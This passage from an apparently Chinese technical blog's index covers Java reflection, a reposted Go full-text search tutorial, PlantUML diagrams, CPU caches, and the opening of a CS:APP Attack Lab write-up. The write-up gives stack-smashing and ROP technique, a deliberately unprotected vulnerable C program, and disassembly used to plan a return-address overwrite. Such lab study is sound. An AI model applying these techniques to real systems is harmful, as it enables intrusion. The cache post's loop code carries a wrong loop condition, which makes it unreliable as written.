通过构造方法中的Constructor的方法 创建对象 Object obj = con.newInstance(&quot;cuzz&quot;, 18, &quot;武汉&quot;); // 获取指定的方法 Method m4 = c.getMethod(&quot;method4&quot;, String.class); // 执行找到的方法 Object result = m4.invoke(obj, &quot;2018/03/19&quot;); System.out.println(&quot;result = &quot; + result); // result = 哈哈2018/03/19 }} 反射练习下面展示一下反射的利用场景。 泛型擦除思考，将已存在的ArrayList&lt;Integer&gt;集合中添加一个字符串数据，如何实现呢？ 我来告诉大家，其实程序编译后产生的.class文件中是没有泛型约束的，这种现象我们称为泛型的擦除。那么，我们可以通过反射技术，来完成向有泛型约束的集合中，添加任意类型的元素。 package cn.cuzz;import java.lang.reflect.Method;import java.util.ArrayList;public class Test7 { public static void main(String[] args) throws Exception, SecurityException { ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); // 添加元素 list.add(&quot;cuzz&quot;); // list.add(23); 报错 // 通过反射技术，实现添加任意类型的元素 // 获取字节码文件对象 Class c = Class.forName(&quot;java.util.ArrayList&quot;); // 找到add()方法 Method addMethod = c.getMethod(&quot;add&quot;, Object.class); // 执行add()方法 addMethod.invoke(list, 23); System.out.println(list); //[cuzz, 23] }} 反射配置文件通过配置文件得到类名和要运行的方法名,用反射的操作类名得到对象和调用方法 实现步骤: 准备配置文件,键值对 IO流读取配置文件 Reader 文件中的键值对存储到集合中 Properties集合保存的键值对,就是类名和方法名 反射获取指定类的class文件对象 class文件对象,获取指定的方法 运行方法 public class Test8 { public static void main(String[] args) throws Exception{ // IO流读取配置文件 FileReader r = new FileReader(&quot;config.properties&quot;); // 创建集合对象 Properties pro = new Properties(); // 调用集合方法load,传递流对象 pro.load(r); r.close(); // 通过键获取值 String className = pro.getProperty(&quot;className&quot;); String methodName = pro.getProperty(&quot;methodName&quot;); // 反射获取指定类的class文件对象 Class c = Class.forName(className); Object obj = c.newInstance(); // 获取指定的方法名 Method method = c.getMethod(methodName); method.invoke(obj); }} 配置文件 # className=cn.cuzz.Student# methodName=studyclassName=cn.cuzz.TeachermethodName=teach# className=cn.cuzz.Worker# methodName=work","link":"/2019/02/11/Java%E5%8F%8D%E5%B0%84/"},{"title":"Let&#39;s build a Full-Text Search engine","text":"这是一篇转载文章原文地址，原文讲述如何构建一个全文搜索引擎，用的 Go 实现的，本来想翻译一下，顺便用 Java 实现一下，由于翻译出来比较生硬，还是把原文放出来，顺便把我用 Java 实现的版本放在链接中Java实现版本。 Full-Text Search is one of those tools people use every day without realizing it. If you ever googled “golang coverage report” or tried to find “indoor wireless camera” on an e-commerce website, you used some kind of full-text search. Full-Text Search (FTS) is a technique for searching text in a collection of documents. A document can refer to a web page, a newspaper article, an email message, or any structured text. Today we are going to build our own FTS engine. By the end of this post, we’ll be able to search across millions of documents in less than a millisecond. We’ll start with simple search queries like “give me all documents that contain the word cat“ and we’ll extend the engine to support more sophisticated boolean queries. Note Most well-known FTS engine is Lucene (as well as Elasticsearch and Solr built on top of it). Why FTSBefore we start writing code, you may ask “can’t we just use grep or have a loop that checks if every document contains the word I’m looking for?“. Yes, we can. However, it’s not always the best idea. CorpusWe are going to search a part of the abstract of English Wikipedia. The latest dump is available at dumps.wikimedia.org. As of today, the file size after decompression is 913 MB. The XML file contains over 600K documents. Document example: &lt;title&gt;Wikipedia: Kit-Cat Klock&lt;/title&gt;&lt;url&gt;https://en.wikipedia.org/wiki/Kit-Cat_Klock&lt;/url&gt;&lt;abstract&gt;The Kit-Cat Klock is an art deco novelty wall clock shaped like a grinning cat with cartoon eyes that swivel in time with its pendulum tail.&lt;/abstract&gt; Loading documentsFirst, we need to load all the documents from the dump. The built-in encoding/xml package comes very handy: import ( &quot;encoding/xml&quot; &quot;os&quot;)type document struct { Title string `xml:&quot;title&quot;` URL string `xml:&quot;url&quot;` Text string `xml:&quot;abstract&quot;` ID int}func loadDocuments(path string) ([]document, error) { f, err := os.Open(path) if err != nil { return nil, err } defer f.Close() dec := xml.NewDecoder(f) dump := struct { Documents []document `xml:&quot;doc&quot;` }{} if err := dec.Decode(&amp;dump); err != nil { return nil, err } docs := dump.Documents for i := range docs { docs[i].ID = i } return docs, nil} Every loaded document gets assigned a unique identifier. To keep things simple, the first loaded document gets assigned ID=0, the second ID=1 and so on. First attemptSearching the contentNow that we have all documents loaded into memory, we can try to find the ones about cats. At first, let’s loop through all documents and check if they contain the substring cat: func search(docs []document, term string) []document { var r []document for _, doc := range docs { if strings.Contains(doc.Text, term) { r = append(r, doc) } } return r} On my laptop, the search phase takes 103ms - not too bad. If you spot check a few documents from the output, you may notice that the function matches caterpillar and category, but doesn’t match Cat with the capital C. That’s not quite what I was looking for. We need to fix two things before moving forward: Make the search case-insensitive (so Cat matches as well). Match on a word boundary rather than on a substring (so caterpillar and communication don’t match). Searching with regular expressionsOne solution that quickly comes to mind and allows implementing both requirements is regular expressions. Here it is - (?i)\\bcat\\b: (?i) makes the regex case-insensitive \\b matches a word boundary (position where one side is a word character and another side is not a word character) func search(docs []document, term string) []document { re := regexp.MustCompile(`(?i)\\b` + term + `\\b`) // Don't do this in production, it's a security risk. term needs to be sanitized. var r []document for _, doc := range docs { if re.MatchString(doc.Text) { r = append(r, doc) } } return r} Ugh, the search took more than 2 seconds. As you can see, things started getting slow even with 600K documents. While the approach is easy to implement, it doesn’t scale well. As the dataset grows larger, we need to scan more and more documents. The time complexity of this algorithm is linear - the number of documents required to scan is equal to the total number of documents. If we had 6M documents instead of 600K, the search would take 20 seconds. We need to do better than that. Inverted IndexTo make search queries faster, we’ll preprocess the text and build an index in advance. The core of FTS is a data structure called Inverted Index. The Inverted Index associates every word in documents with documents that contain the word. Example: documents = { 1: &quot;a donut on a glass plate&quot;, 2: &quot;only the donut&quot;, 3: &quot;listen to the drum machine&quot;,}index = { &quot;a&quot;: [1], &quot;donut&quot;: [1, 2], &quot;on&quot;: [1], &quot;glass&quot;: [1], &quot;plate&quot;: [1], &quot;only&quot;: [2], &quot;the&quot;: [2, 3], &quot;listen&quot;: [3], &quot;to&quot;: [3], &quot;drum&quot;: [3], &quot;machine&quot;: [3],} Below is a real-world example of the Inverted Index. An index in a book where a term references a page number: Text analysisBefore we start building the index, we need to break the raw text down into a list of words (tokens) suitable for indexing and searching. The text analyzer consists of a tokenizer and multiple filters. TokenizerThe tokenizer is the first step of text analysis. Its job is to convert text into a list of tokens. Our implementation splits the text on a word boundary and removes punctuation marks: func tokenize(text string) []string { return strings.FieldsFunc(text, func(r rune) bool { // Split on any character that is not a letter or a number. return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) })} &gt; tokenize(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;] FiltersIn most cases, just converting text into a list of tokens is not enough. To make the text easier to index and search, we’ll need to do additional normalization. LowercaseIn order to make the search case-insensitive, the lowercase filter converts tokens to lower case. cAt, Cat and caT are normalized to cat. Later, when we query the index, we’ll lower case the search terms as well. This will make the search term cAt match the text Cat. func lowercaseFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = strings.ToLower(token) } return r} &gt; lowercaseFilter([]string{&quot;A&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;Only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;] Dropping common wordsAlmost any English text contains commonly used words like a, I, the or be. Such words are called stop words. We are going to remove them since almost any document would match the stop words. There is no “official” list of stop words. Let’s exclude the top 10 by the OEC rank. Feel free to add more: var stopwords = map[string]struct{}{ // I wish Go had built-in sets. &quot;a&quot;: {}, &quot;and&quot;: {}, &quot;be&quot;: {}, &quot;have&quot;: {}, &quot;i&quot;: {}, &quot;in&quot;: {}, &quot;of&quot;: {}, &quot;that&quot;: {}, &quot;the&quot;: {}, &quot;to&quot;: {},}func stopwordFilter(tokens []string) []string { r := make([]string, 0, len(tokens)) for _, token := range tokens { if _, ok := stopwords[token]; !ok { r = append(r, token) } } return r} &gt; stopwordFilter([]string{&quot;a&quot;, &quot;donut&quot;, &quot;on&quot;, &quot;a&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;the&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;] StemmingBecause of the grammar rules, documents may include different forms of the same word. Stemming reduces words into their base form. For example, fishing, fished and fisher may be reduced to the base form (stem) fish. Implementing a stemmer is a non-trivial task, it’s not covered in this post. We’ll take one of the existing modules: import snowballeng &quot;github.com/kljensen/snowball/english&quot;func stemmerFilter(tokens []string) []string { r := make([]string, len(tokens)) for i, token := range tokens { r[i] = snowballeng.Stem(token, false) } return r} &gt; stemmerFilter([]string{&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donuts&quot;})[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] Note A stem is not always a valid word. For example, some stemmers may reduce airline to airlin. Putting the analyzer togetherfunc analyze(text string) []string { tokens := tokenize(text) tokens = lowercaseFilter(tokens) tokens = stopwordFilter(tokens) tokens = stemmerFilter(tokens) return tokens} The tokenizer and filters convert sentences into a list of tokens: &gt; analyze(&quot;A donut on a glass plate. Only the donuts.&quot;)[&quot;donut&quot;, &quot;on&quot;, &quot;glass&quot;, &quot;plate&quot;, &quot;only&quot;, &quot;donut&quot;] The tokens are ready for indexing. Building the indexBack to the inverted index. It maps every word in documents to document IDs. The built-in map is a good candidate for storing the mapping. The key in the map is a token (string) and the value is a list of document IDs: type index map[string][]int Building the index consists of analyzing the documents and adding their IDs to the map: func (idx index) add(docs []document) { for _, doc := range docs { for _, token := range analyze(doc.Text) { ids := idx[token] if ids != nil &amp;&amp; ids[len(ids)-1] == doc.ID { // Don't add same ID twice. continue } idx[token] = append(ids, doc.ID) } }}func main() { idx := make(index) idx.add([]document{{ID: 1, Text: &quot;A donut on a glass plate. Only the donuts.&quot;}}) idx.add([]document{{ID: 2, Text: &quot;donut is a donut&quot;}}) fmt.Println(idx)} It works! Each token in the map refers to IDs of the documents that contain the token: map[donut:[1 2] glass:[1] is:[2] on:[1] only:[1] plate:[1]] QueryingTo query the index, we are going to apply the same tokenizer and filters we used for indexing: func (idx index) search(text string) [][]int { var r [][]int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { r = append(r, ids) } } return r} &gt; idx.search(&quot;Small wild cat&quot;)[[24, 173, 303, ...], [98, 173, 765, ...], [[24, 51, 173, ...]] And finally, we can find all documents that mention cats. Searching 600K documents took less than a millisecond (18µs)! With the inverted index, the time complexity of the search query is linear to the number of search tokens. In the example query above, other than analyzing the input text, search had to perform only three map lookups. Boolean queriesThe query from the previous section returned a disjoined list of documents for each token. What we normally expect to find when we type small wild cat in a search box is a list of results that contain small, wild and cat at the same time. The next step is to compute the set intersection between the lists. This way we’ll get a list of documents matching all tokens. Luckily, IDs in our inverted index are inserted in ascending order. Since the IDs are sorted, it’s possible to compute the intersection between two lists in linear time. The intersection function iterates two lists simultaneously and collect IDs that exist in both: func intersection(a []int, b []int) []int { maxLen := len(a) if len(b) &gt; maxLen { maxLen = len(b) } r := make([]int, 0, maxLen) var i, j int for i &lt; len(a) &amp;&amp; j &lt; len(b) { if a[i] &lt; b[j] { i++ } else if a[i] &gt; b[j] { j++ } else { r = append(r, a[i]) i++ j++ } } return r} Updated search analyzes the given query text, lookups tokens and computes the set intersection between lists of IDs: func (idx index) search(text string) []int { var r []int for _, token := range analyze(text) { if ids, ok := idx[token]; ok { if r == nil { r = ids } else { r = intersection(r, ids) } } else { // Token doesn't exist. return nil } } return r} The Wikipedia dump contains only two documents that match small, wild and cat at the same time: &gt; idx.search(&quot;Small wild cat&quot;)130764 The wildcat is a species complex comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).131692 Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat. The search is working as expected! By the way, this is the first time I hear about catopuma, here is one of them: ConclusionsWe just built a Full-Text Search engine. Despite its simplicity, it can be a solid foundation for more advanced projects. I didn’t touch on a lot of things that can significantly improve the performance and make the engine more user friendly. Here are some ideas for further improvements: Extend boolean queries to support OR and NOT. Store the index on disk: Rebuilding the index on every application restart may take a while. Large indexes may not fit in memory. Experiment with memory and CPU-efficient data formats for storing sets of document IDs. Take a look at Roaring Bitmaps. Support indexing multiple document fields. Sort results by relevance. The full source code is available on GitHub. I’m not a native English speaker and I’m trying to improve my language skills. Feel free to correct me if you spot any spelling or grammatical error!","link":"/2020/08/17/Let's_build_a_Full-Text_Search_engine/"},{"title":"Markdown绘制UML图","text":"makedown 用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token认证中心 -&gt; 用户: 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证缓存 -&gt; 认证中心: key=token+ip获取token认证中心-&gt;其他服务: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息 测试 @startuml用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token 用户 &lt;- 认证中心 : 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证认证中心 &lt;- 缓存: key=token+ip获取token其他服务 &lt;- 认证中心: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息@enduml @startuml用户 -&gt; 认证中心: 登录操作认证中心 -&gt; 缓存: 存放(key=token+ip,value=token)token用户 &lt;- 认证中心 : 认证成功返回token用户 -&gt; 认证中心: 下次访问头部携带token认证认证中心 &lt;- 缓存: key=token+ip获取token其他服务 &lt;- 认证中心: 存在且校验成功则跳转到用户请求的其他服务其他服务 -&gt; 用户: 信息@enduml","link":"/2000/05/10/Markdown%E7%BB%98%E5%88%B6UML%E5%9B%BE/"},{"title":"深入理解高速缓存工作原理","text":"为什么需要高速缓存早期 CPU 相比现在的 CPU 比较简单，没有 Cache 的计算机系统的简化模型，CPU在执行时需要的指令和数据通过内存总线和系统总线由内存传送到寄存器，再由寄存器送入ALU）。 那时候，CPU 内核的频率与内存总线的频率相当。内存访问只比寄存器访问慢一点。随着 CPU 内核频率不断增加，内存总线的频率和 RAM 芯片的性能并没有成比例增加。 下图展示了CPU和主存（DRAM）、磁盘速度上的差距。可以看到，CPU的速度大概是主存的几十倍，如果没有Cache（SRAM），这就出现了 CPU 等待 I/O 访存的现象，致使CPU空等一段时间，甚至可能等待几个主存周期，从而降低了CPU 的工作效率。 在 CUP 和 DRAM 之间引入高速 SRAM，来弥补这种差距，当 CPU 需要数据时，先查 SRAM（Cache）中，如果在 Cache 中可以查询到，叫作缓存命中，则就不需要访问 DRAM 了，节约时间。 程序局部性原理为了充分发挥 Cache 的能力，使得机器的速度能够切实的得到提高，必须要保障 CPU 访问的指令或数据大多情况下都能够在 Cache 中找到，这样依靠程序访问的局部性原理。 时间局部性：最近访问的数据可能在不久的将来会再次访问 空间局部性：位置相近的数据常常在相近的时间内被访问 存储山由于不同的存储技术在存储速度和造价上相差巨大，为了高效的访问数据，现代计算机的存储系统会把最常用的数据放在读存速度快的存储设备上，而把不常用的数据放在读存速度慢的存储设备上。 存储器系统是一个具有不同容量、成本和访问时间的存储设备的层级结构。从上往下容量越来越大，但访问速度越来越慢。上一层做为下一层的缓存来存储访问频率更高的数据， 比如，CPU 寄存器保存着最常用的数据。靠近 CPU 的小的、快速的高速缓存存储器是内存上一部分数据和指令的缓冲区域。主存缓存磁盘上的数据，而这些磁盘又常常作为存储在通过网络连接的其他机器的磁盘或磁带上的数据的缓冲区域。存储层次如下： 高速缓存原理假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块。 Cache由硬件管理，硬件在得到内存地址后会将地址划分为三个部分 首先根据组下标选择一个组，然后将地址中的标签与被选中组的每个行中的标签进行比较，如果标签相等，且有效位为1，则 Cache 命中，再根据块偏移从行中选出相应的数据。 假设计算机储存地址为 m 位，形成 M = 2^m 个不同的地址，就会形成 S = 2^s 个缓存组（cache set），每组包含 E 个高速缓存行（cache line），每行包含一个有效位（valid bit）指明这个行是否有效，t 个标记位（tag bit）和 B = 2^b 个缓存数据块 假设 m = 4，t = 2，s = 1，b = 1，E = 2 可知： M = 2^m = 2^4 = 16 S = 2^s = 2^1 = 2 B = 2^b = 2^1 = 2 分别读取地址为 0、1、7、8、0 这几个地址，看看缓存能命中哪些？ 具体过程如图： 高速缓存不命中替换 如果 CPU 请求的数据不在任何一行中，那么缓存不命中，如果有空行的话就把数据缓存到空行中，如果没有空行，那我们必须选择一个非空行替换。可以使用 LRU 算法来替换。 为什么使用中间位来做索引？假设我们有一个缓存组可以缓存四块，如果我们去 0000 这块数据，并且把 0001、0002 和 0003 这三块数据加入缓存中，就会发现，使用高位缓存只能缓存一块数据，而使用中间位来索引可以缓存四块数据。所以使用高位做缓存缓存的使用效率很低。 高速缓存读与写高速缓存读 首先，在高速缓存中查找所需字 w 的副本。如果命中，立即返回字 w 给CPU。如果不命中，从存储器层次结构中较低层中取出包含字 w 的块，将这个块存储到某个高速缓存行中，然后返回字 w。 高速缓存写 写命中 直写（write-through），写一个已经缓存了的字w（写命中，write hit），立即将w的高速缓存块写回到紧接着的低一层中。 写回（write-back），尽可能的推迟更新，只有当替换算法要驱逐这个更新过的块时，才把写到紧接着的低一层中。高速缓存必须为每一个高速缓存行维护一个额外的修改位（dirty bit），表明这个高速缓存块是否被修改过。 写不命中 写分配（write-allocate），加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。 非写分配（not-write-allocate），避开高速缓存，直接把这个字写到低一层中。 Cache 失效的三种原因 Cold miss：刚刚使用Cache时Cache为空，此时必然发生Cache miss。 Capacity miss：程序最经常使用的那些数据(工作集,working set)超过了Cache的大小 Conflict miss：Cache容量足够大，但是不同的数据映射到了同一组，从而造成Cache line反复被替换的现象。 高速缓存结构我们看看 Intel Core i7 处理器的高速缓存层次结构。每个 CPU 芯片有四个核。每个核有自己的 L1 i-cache（指令高速缓存）、L1 d-cache（数据高速缓存）、和 L2 统一高速缓存。以及 L3 为所有核共享高速缓存。所有的缓存都是集成在 CPU 芯片上。 下面指标高速缓存类型（Cache Type）、访问周期（Access time）、缓存大小（Cache size）、一组有多少行（Assoc）、块大小（Block size）以及组数（Set）。 编写高速缓存友好代码假设我们需要来计算一个二维数组的和，有两种方式分别是按行计算和按列计算。 假设我们高速缓存为 4 字，可以缓存 4 和 int 的值。 按行计算 int sumarrrayrows(int a[M][N]) { int i, j, sum = 0; for (i = 0; i &lt; M; i++) { for (j = 0; i &lt; N; j++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，如果是按行，后面这几个就会缓存命中。 具体缓存命中情况如图： 按列计算 int sumarrraycols(int a[M][N]) { int i, j, sum = 0; for (j = 0; i &lt; N; j++) { for (i = 0; i &lt; M; i++) { sum += a[i][j]; } } return sum;} 当我们加载地址为1的数，会把 2、3和4地址的数据加载到高速缓存中，然而我们下个取得是 5 所以缓存不命中，同时会把 6、7和8地址加到缓存中。接着下个取地址为9的值，缓存又不命中。 具体缓存情况如图： 我们看上去只是调换了一下顺序，缓存命中相差很大，所以编写高速缓存友好代码。 总结学习到了高速缓存原理，以及编写高速缓存友好代码。 参考 深入理解计算机系统 深入理解处理器高速缓存的工作机制 Linux内存系列2 - CPU Cache 计算机组成原理（2）-cache高速缓存存储器","link":"/2020/11/28/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"},{"title":"Attack Lab","text":"介绍主要分为两种不同类型的攻击： Buffer overflow attacks ROP attacks 大概介绍下每个文件的作用： ctarget: 用来做代码注入攻击的程序 rtarget: 用来做 ROP 攻击的程序 cookie.txt: 一个 8 位的 16 进制代码，用来作为攻击的标识符 farm.c: 用来找寻 gadget 的源文件 hex2raw: 用来生成攻击字符串的程序 有几点需要注意： 输入的字符串中不能有 0x0a，因为这是 \\n 的意思，遇到这个的话会提前结束输入 hex2raw 每次需要输入一个 2 位的 16 进制编码，如果想要输出 0，那么需要写 00。想要转换 0xdeadbeef，需要传入 ef be ad de，因为是 little-endian 规则 通过完成本实验达到： 深入理解当程序没有对缓冲区溢出做足够防范时，攻击者可能会如何利用这些安全漏洞。 深入理解x86-64机器代码的栈和参数传递机制。 深入理解x86-64指令的编码方式。 熟练使用 gdb 和 objdump 等调试工具。 更好地理解写出安全的程序的重要性，了解到一些编译器和操作系统提供的帮助改善程序安全性的特性。 背景知识缓冲区溢出我们通过一个一个例子来观察： #include&lt;stdio.h&gt;typedef struct { int a[2]; double d;} struct_t;double fun(int i) { volatile struct_t s; s.d = 3.14; s.a[i] = 1073741824; /* Possibly out of bounds */ return s.d;}int main() { int i = 0; double d = 0.0; while(1) { scanf(&quot;%d&quot;, &amp;i); d = fun(i); printf(&quot;fun(%d) -&gt; %.10f \\n&quot;,i, d); }} 输出结果： fun(0) -&gt; 3.1400000000fun(1) -&gt; 3.1400000000fun(2) -&gt; 3.1399998665fun(3) -&gt; 2.0000006104fun(4) -&gt; 3.1400000000fun(5) -&gt; 3.1400000000fun(6) -&gt; segmentation fault 具体内存中 6 其他特殊字节 f(6)改变了栈中的关键信息，报错5 其他特殊字节 f(5)改变了栈中的非关键信息，不影响4 其他特殊字节 f(4)改变了栈中的非关键信息，不影响3 d中高4字节 f(3)改变了d中的高4字节2 d中低4字节 f(2)改变了d中的低4字节1 a[1] f(1)改变不影响0 a[0] f(0)改变不影响 在 Unix 标准库中的 gets 函数也会出现缓存溢出，随着用户不断输入，缓存区可以不够。 char *gets(char *dest) { int c = getchar(); char *p = dest; while (c != EOF &amp;&amp; c != '\\n') { *p++ = c; c = getchar(); } *p = '\\0'; return dest; } 由于C语言中对数组引用不做任何边界检查，而且局部变量和状态信息（例如保存的寄存器值和返回地址）都存放在栈中，所以对越界的数组元素的写操作会破坏存储在栈中的状态信息，可能会产生严重的后果。 栈溢出攻击栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf 等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。这种攻击方法就是栈溢出攻击（stack smashing attacks） #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* target code */void smash(){ printf(&quot;I've been smashed!\\n&quot;); exit(0);}/* Implementation of library function gets() */char *gets(char *s){ int c; char *dest = s; while((c = getchar()) != '\\n' &amp;&amp; c != EOF) *dest++ = c; if(c == EOF &amp;&amp; dest == s) /* No characters read */ return NULL; *dest++ = '\\0'; /* Terminate string */ return s;}/** Read input line and write it back */void echo(){ char buf[4]; gets(buf); puts(buf);}int main(int argc, char* argv[]){ echo(); return 0;} 使用如下命令编译： gcc -fno-asynchronous-unwind-tables -fno-stack-protector -O1 echo.c -o echo -fno-asynchronous-unwind-tables :不生成CFI指令 -fno-stack-protector :阻止进行栈破坏检测，默认是允许使用栈保护者 -O1:不做任何优化处理 使用objdump反汇编得到如下结果： 000000000000073a &lt;smash&gt;: 73a: 48 83 ec 08 sub $0x8,%rsp 73e: 48 8d 3d 1f 01 00 00 lea 0x11f(%rip),%rdi # 864 &lt;_IO_stdin_used+0x4&gt; 745: e8 a6 fe ff ff callq 5f0 &lt;puts@plt&gt; 74a: bf 00 00 00 00 mov $0x0,%edi 74f: e8 bc fe ff ff callq 610 &lt;exit@plt&gt;000000000000079d &lt;echo&gt;: 79d: 53 push %rbx 79e: 48 83 ec 10 sub $0x10,%rsp 7a2: 48 8d 5c 24 0c lea 0xc(%rsp),%rbx 7a7: 48 89 df mov %rbx,%rdi 7aa: e8 a5 ff ff ff callq 754 &lt;gets&gt; 7af: 48 89 df mov %rbx,%rdi 7b2: e8 39 fe ff ff callq 5f0 &lt;puts@plt&gt; 7b7: 48 83 c4 10 add $0x10,%rsp 7bb: 5b pop %rbx 7bc: c3 retq 00000000000007bd &lt;main&gt;: 7bd: 48 83 ec 08 sub $0x8,%rsp 7c1: b8 00 00 00 00 mov $0x0,%eax 7c6: e8 d2 ff ff ff callq 79d &lt;echo&gt; 7cb: b8 00 00 00 00 mov $0x0,%eax # 调用echo之后返回这里 7d0: 48 83 c4 08 add $0x8,%rsp 7d4: c3 retq 7d5: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 7dc: 00 00 00 7df: 90 nop 具体的执行到 echo 函数的栈帧，当我们输入超过 23 个字符（加上\\0 一共24个），就会影响到返回地址。如果最后地址为00000000 0000073a 就能转到 smash 方法。 代码注入攻击Code Injection Attacks（代码注入攻击）是指输入的字符串中包含exploit code的字节表示，将返回地址改成exploit code的首地址，这样在ret时将会跳转到exploit code处执行。 ROP 攻击缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。 （1）栈随机化 栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。 （2）栈破坏检测 最近的GCC版本在产生的代码加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。 （3）限制可执行代码区域 最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。 ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。 在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以ret结尾，这一段指令序列，我们称之为gadget。 每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。 示例 void setval_210(unsigned *p){ *p = 3347663060U;} 对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列: 0000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 其中，字节序列48 89 c7是对指令movq %rax, %rdi的编码，这就是一个 gadget，就这样我们可以利用已经存在的程序，从中提取出特定的指令，执行特定的功能，地址为0x400f18，其功能是将%rax的内容移到%rdi。 下面是指令参考表： 防止栈溢出攻击方法 避免使用gets等存在安全隐患的库函数 操作系统层面：栈随机偏移。在每次程序执行之初，在栈上申请一段随机大小的空间使整个栈移动一段距离，这样可以防止黑客预测exploit code开始的地址 操作系统层面：将栈设置为不可执行(Nonexecutable)，这样执行exploit code时会报错 金丝雀(canary)机制。在buffer之外放置一个特殊的保护值(canary)，在函数执行完返回之前检查保护值是否被更改，如果被更改则检测到stack smashing。 实验部分阶段一这个需要我们在执行 test ，可以调用另外方法，进行劫持程序。在这个阶段中，我们的任务是在test函数执行完getbuf后返回到touch1函数。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch1(){ vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1()\\n&quot;); validate(1); exit(0);} 思路： 找到getbuf函数在栈上为输入字符串分配的缓冲区大小 找到touch1函数的首地址 构造 exploit code，将缓冲区填满，并在随后的8个字节(返回地址)上填写touch1函数的首地址 查看 getbuf 缓冲区大小，sub $0x28,%rsp，可以知道在栈上分配了 40 字节大小。 (gdb) disas getbufDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump. 找到 touch1 的首地址，为 0x004017c0 (gdb) disas touch1Dump of assembler code for function touch1: 0x00000000004017c0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004017c4 &lt;+4&gt;: movl $0x1,0x202d0e(%rip) # 0x6044dc &lt;vlevel&gt; 0x00000000004017ce &lt;+14&gt;: mov $0x4030c5,%edi 0x00000000004017d3 &lt;+19&gt;: callq 0x400cc0 &lt;puts@plt&gt; 0x00000000004017d8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004017dd &lt;+29&gt;: callq 0x401c8d &lt;validate&gt; 0x00000000004017e2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004017e7 &lt;+39&gt;: callq 0x400e40 &lt;exit@plt&gt;End of assembler dump. 前 40 